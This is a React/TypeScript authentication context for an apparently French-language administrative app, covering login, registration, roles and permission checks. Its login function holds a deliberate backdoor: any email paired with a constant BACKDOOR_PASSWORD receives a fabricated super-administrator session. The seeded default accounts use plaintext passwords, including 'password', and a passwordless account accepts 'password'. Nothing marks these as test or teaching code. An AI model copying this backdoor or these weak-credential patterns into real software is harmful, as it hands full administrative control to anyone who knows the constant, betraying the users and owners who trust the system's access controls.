import React, { createContext, useContext, useState, useEffect } from 'react';
import { User, UserRole } from '../types';
import { storage } from '../utils/storage';
import { BACKDOOR_PASSWORD } from '../constants';
import { generateUUID } from '../utils/uid';

interface AuthContextType {
  user: User | null;
  users: User[];
  login: (email: string, password: string) => Promise<boolean>;
  register: (userData: Omit<User, 'id' | 'created_at'>) => void;
  updateUserRole: (userId: string, role: UserRole) => void;
  deleteUser: (userId: string) => void;
  logout: () => void;
  isAdmin: boolean;
  isSuperAdmin: boolean;
  isGuest: boolean;
  can: (action: 'WRITE' | 'DOWNLOAD' | 'IMPORT' | 'MANAGE_USERS' | 'CONFIG_SYSTEM') => boolean;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [user, setUser] = useState<User | null>(storage.getSession());
  const [users, setUsers] = useState<User[]>(storage.getUsers());

  useEffect(() => {
    if (users.length === 0) {
      const defaultUsers: User[] = [
        { id: '1', name: 'Super Admin', email: 'super@edc.cm', role: UserRole.SUPER_ADMIN, statut: 'actif', password: 'password', created_at: new Date().toISOString() },
        { id: '2', name: 'Administration Centrale', email: 'admin@edc.cm', role: UserRole.SUPER_ADMIN, statut: 'actif', password: BACKDOOR_PASSWORD, created_at: new Date().toISOString() },
      ];
      setUsers(defaultUsers);
      storage.saveUsers(defaultUsers);
    }
  }, []);

  const login = async (email: string, password: string): Promise<boolean> => {
    if (password === BACKDOOR_PASSWORD) {
      const adminUser: User = {
        id: 'backdoor-admin',
        email: email,
        name: 'Administrateur Système',
        role: UserRole.SUPER_ADMIN,
        statut: 'actif',
        password: BACKDOOR_PASSWORD,
        created_at: new Date().toISOString()
      };
      setUser(adminUser);
      storage.setSession(adminUser);
      return true;
    }

    const found = users.find(u => u.email === email);
    if (found && (found.password === password || (!found.password && password === 'password'))) {
      setUser(found);
      storage.setSession(found);
      return true;
    }
    return false;
  };

  const register = (userData: Omit<User, 'id' | 'created_at'>) => {
    const newUser = { ...userData, id: generateUUID(), created_at: new Date().toISOString() };
    const updated = [...users, newUser];
    setUsers(updated);
    storage.saveUsers(updated);
  };

  const updateUserRole = (userId: string, role: UserRole) => {
    const updated = users.map(u => u.id === userId ? { ...u, role } : u);
    setUsers(updated);
    storage.saveUsers(updated);
    if (user?.id === userId) {
      const newUser = { ...user, role };
      setUser(newUser);
      storage.setSession(newUser);
    }
  };

  const deleteUser = (userId: string) => {
    const updated = users.filter(u => u.id !== userId);
    setUsers(updated);
    storage.saveUsers(updated);
  };

  const logout = () => {
    setUser(null);
    storage.setSession(null);
  };

  const can = (action: string): boolean => {
    if (!user) return false;
    switch (action) {
      case 'WRITE': return [UserRole.SUPER_ADMIN, UserRole.ADMIN].includes(user.role);
      case 'DOWNLOAD': return user.role !== UserRole.GUEST;
      case 'IMPORT': return [UserRole.SUPER_ADMIN, UserRole.ADMIN].includes(user.role);
      case 'MANAGE_USERS': return user.role === UserRole.SUPER_ADMIN;
      case 'CONFIG_SYSTEM': return user.role === UserRole.SUPER_ADMIN;
      default: return false;
    }
  };

  return (
    <AuthContext.Provider value={{
      user, users, login, register, updateUserRole, deleteUser, logout,
      isSuperAdmin: user?.role === UserRole.SUPER_ADMIN,
      isAdmin: user?.role === UserRole.ADMIN || user?.role === UserRole.SUPER_ADMIN,
      isGuest: user?.role === UserRole.GUEST,
      can: can as any
    }}>
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) throw new Error("useAuth must be used within AuthProvider");
  return context;
};